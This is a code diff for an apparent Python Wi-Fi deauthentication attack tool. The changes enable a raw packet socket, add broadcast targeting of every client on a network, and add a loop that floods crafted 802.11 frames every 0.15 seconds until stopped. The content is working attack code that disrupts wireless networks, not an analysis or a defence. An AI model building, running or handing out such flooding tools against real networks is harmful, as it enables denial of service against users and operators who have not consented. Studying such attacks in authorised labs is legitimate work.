@@ -27,6 +27,7 @@ import rt # Adds radio tap header
 import os
 import struct  # Unpacking binary data (e.g., network headers)
 import sys
+import time
 
 def f_assem(args):
     # Parse command-line arguments
@@ -52,7 +53,7 @@ def f_assem(args):
         exit(1)
     # handle all illogical arguments
     if (broadcast_attack or timedelay or frame_flood or num_frames or
-    frag_size or seq_num or reason or dur_of_attack) and not dest_mac:
+    frag_size or seq_num or reason or dur_of_attack) and not (dest_mac or broadcast_attack):
         print("Error: target input required") # requires target input for most operations
         exit(1)
     if (broadcast_attack or timedelay or frame_flood or num_frames or
@@ -83,13 +84,13 @@ def f_assem(args):
 
     # Address 1 field
     if broadcast_attack:
-        ct = convert.machex('FF:FF:FF:FF:FF:FF')
+        ct = struct.pack('!6B', 0xFF, 0XFF, 0XFF, 0XFF, 0XFF, 0XFF)
     elif dest_mac:
         ct = convert.machex(dest_mac)
 
     # Address 2 field, if not given Address 3 fills
     if not source_mac:
-        src = network_bssid
+        src = convert.machex(network_bssid)
     elif source_mac:
         src = convert.machex(source_mac)
 
@@ -129,15 +130,33 @@ def main():
     frame_flood = args.flood # mapped
     num_frames = args.count # mapped
     dur_of_attack = args.duration # mapped
+    interface = args.netinterface
+    verbose = args.verbose
+
+    df = f_assem(args)
+    radio = rt.rt_head()
+    frame = radio + df
 
     # Open the socket
-    # s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
-    # s.bind((interface, 0))
+    s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
+    s.bind((interface, 0))
 
     # if timedelay:
     #     timer.time_delay(timedelay)
-    # if frame_flood:
-    #     massatk.deauthflood(frame_flood)
+    if frame_flood:
+        try:
+            print(f"Flooding: {frame}")
+            while True:
+                s.send(frame)
+                time.sleep(.15)
+                if verbose:
+                    pass
+        except KeyboardInterrupt:
+            print("Ending frame flood")
+        except Exception as e:
+            print(f"Error: {e}")
+        finally:
+            s.close()
     # if num_frames:
     #     timer.user_frames(num_frames)
     # if dur_of_attack:
@@ -153,7 +172,7 @@ def main():
     # finally:
     #     s.close()
 
-    df = f_assem(args)
+    print(frame)
 
 if __name__ == "__main__":
     main()
